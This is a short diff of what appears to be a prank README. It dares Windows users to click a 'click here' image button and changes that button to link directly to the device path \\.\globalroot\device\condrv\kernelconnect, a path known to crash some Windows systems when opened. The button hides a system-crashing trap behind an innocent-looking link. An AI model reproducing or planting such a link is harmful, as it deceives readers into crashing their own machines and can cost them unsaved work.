@@ -7,7 +7,7 @@ If you are a **windows user** and you say this is a joke then just vist link bel
 
 
 <p align="center">
-  <a href="file:\\.\globalroot\device\condrv\kernelconnect"><img src="./images/click-here-button.png" width="250"/></a>
+  <a href="\\.\globalroot\device\condrv\kernelconnect" target="_blank"><img src="./images/click-here-button.png" width="250"/></a>
 </p>
 
 
